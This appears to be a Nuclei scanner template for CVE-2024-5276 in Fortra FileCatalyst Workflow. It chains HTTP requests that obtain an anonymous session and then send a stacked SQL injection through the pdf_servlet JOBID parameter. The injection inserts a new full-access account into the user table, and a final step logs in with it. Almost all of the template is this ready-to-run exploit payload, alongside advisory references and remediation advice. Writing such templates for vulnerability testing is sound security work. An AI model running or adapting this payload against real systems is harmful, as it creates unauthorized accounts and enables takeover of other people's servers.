http:
- extractors:
  - group: 1
    internal: true
    name: jsessionid
    part: body
    regex:
    - logon.jsp;jsessionid=([A-Z0-9]+)
    type: regex
  raw:
  - 'GET /{{ctxpath}}/ HTTP/1.1

    Host: {{Hostname}}

    '
- extractors:
  - group: 1
    internal: true
    name: anonurl
    part: body
    regex:
    - href="(.*)" class="btn btn-outline-primary" id="logonAnonymousLink"
    type: regex
  matchers:
  - internal: true
    part: body
    type: word
    words:
    - logonAnonymous.do
  matchers-condition: and
  raw:
  - 'GET /{{ctxpath}}/jsp/logon.jsp;jsessionid={{jsessionid}} HTTP/1.1

    Host: {{Hostname}}

    '
- raw:
  - 'GET {{anonurl}} HTTP/1.1

    Host: {{Hostname}}

    '
- raw:
  - 'GET /{{ctxpath}}/servlet/pdf_servlet?JOBID={{urlencode(payload)}} HTTP/1.1

    Host: {{Hostname}}

    '
- disable-cookie: true
  extractors:
  - group: 1
    internal: true
    name: fcweb_token
    part: body
    regex:
    - name="FCWEB.FORM.TOKEN" value="([A-Za-z0-9]+)"
    type: regex
  - group: 1
    internal: true
    name: jsessionid2
    part: body
    regex:
    - logon.jsp;jsessionid=([A-Z0-9]+)
    type: regex
  raw:
  - 'GET /{{ctxpath}}/jsp/logon.jsp HTTP/1.1

    Host: {{Hostname}}

    '
- disable-cookie: true
  extractors:
  - dsl:
    - '"USER: "+ username'
    - '"PASS: "+ password'
    type: dsl
  matchers:
  - negative: true
    part: body
    type: word
    words:
    - username/password are not correct
    - Your session timed out.
  - condition: and
    part: body
    type: word
    words:
    - <title>FileCatalyst Workflow Administration</title>
    - '{{to_lower(username)}}'
  matchers-condition: and
  raw:
  - 'POST /{{ctxpath}}/logon.do HTTP/1.1

    Host: {{Hostname}}

    Cookie: JSESSIONID={{jsessionid2}}

    Content-Type: application/x-www-form-urlencoded


    FCWEB.FORM.TOKEN={{fcweb_token}}&username={{to_lower(username)}}&password={{password}}&submit=Login&

    '
id: CVE-2024-5276
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2024-5276
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-20
    epss-percentile: 0.99324
    epss-score: 0.85363
  description: "A SQL Injection vulnerability in Fortra FileCatalyst Workflow allows\
    \ an attacker to modify application data.\_ Likely impacts include creation of\
    \ administrative users and deletion or modification of data in the application\
    \ database. Data exfiltration via SQL injection is not possible using this vulnerability.\
    \ Successful unauthenticated exploitation requires a Workflow system with anonymous\
    \ access enabled, otherwise an authenticated user is required.\_This issue affects\
    \ all versions of FileCatalyst Workflow from 5.1.6 Build 135 and earlier.\n"
  impact: 'Attackers can execute SQL injection to create administrative users, delete
    or modify application database content. Unauthenticated exploitation is possible
    if anonymous access is enabled.

    '
  metadata:
    fofa-query: body="FileCatalyst file transfer solution, easily transfer large files"
    max-request: 6
    verified: true
  name: Fortra FileCatalyst Workflow <= v5.1.6 - SQL Injection
  reference:
  - https://www.tenable.com/security/research/tra-2024-25
  - https://support.fortra.com/filecatalyst/kb-articles/advisory-6-24-2024-filecatalyst-workflow-sql-injection-vulnerability-YmYwYWY4OTYtNTUzMi1lZjExLTg0MGEtNjA0NWJkMDg3MDA0
  - https://www.fortra.com/security/advisory/fi-2024-008
  - https://nvd.nist.gov/vuln/detail/CVE-2024-5276
  remediation: 'Update Fortra FileCatalyst Workflow to version 5.1.7 Build 136 or
    later to address the SQL injection vulnerability.

    '
  severity: critical
  tags: cve,cve2024,sqli,auth-bypass,fortra,filecatalyst,instrusive,sqli,vkev,vuln
variables:
  ctxpath: workflow
  password: '{{randstr_2}}'
  password_enc: '{{to_upper(md5(password))}}'
  payload: 1';INSERT INTO DOCTERA_USERS (USERNAME, PASSWORD, ENCPASSWORD, FIRSTNAME,
    LASTNAME, COMPANY, ADDRESS, ADDRESS2, CITY, STATE, ALTPHONE, ZIP, COUNTRY, PHONE,
    FAX, EMAIL, LASTLOGIN, CREATION, PREFERREDSERVER, CREDITCARDTYPE, CREDITCARDNUMBER,
    CREDITCARDEXPIRY, ACCOUNTSTATUS, USERTYPE, COMMENT, ADMIN, SUPERADMIN, ACCEPTEMAIL,
    ALLOWHOTFOLDER, PROTOCOL, BANDWIDTH, DIRECTORY, SLOWSTARTRATE, USESLOWSTART, SLOWSTARTAGGRESSIONRATE,
    BLOCKSIZE, UNITSIZE, NUMENCODERS, NUMFTPSTREAMS, ALLOWUSERBANDWIDTHTUNING, EXPIRYDATE,
    ALLOWTEMPACCOUNTCREATION, OWNERUSERNAME, USERLEVEL, UPLOADMETHOD, PW_CHANGEABLE,
    PW_CREATIONDATE, PW_DAYSBEFOREEXPIRE, PW_MUSTCHANGE, PW_USEDPASSWORDS, PW_NUMERRORS)
    VALUES('{{to_lower(username)}}', NULL, '{{password_enc}}', '{{to_lower(username)}}FirstName',
    '{{to_lower(username)}}LastName', '', '', '', '', '', '', '', '', '202-404-2400',
    '', '{{to_lower(username)}}@mydomain.local', 1714014839723, 1714013661166, 'default',
    '', '', '', 'full access', '', '', 1, 0, 0, 0, 'DEFAULT', '0', 0, '0', 1, '',
    '', '', '', '', 0, 0, 0, '', 0, 'DEFAULT', 0, 1714014752270, -1, 0, NULL, 0);--
    -
  username: '{{randstr}}'
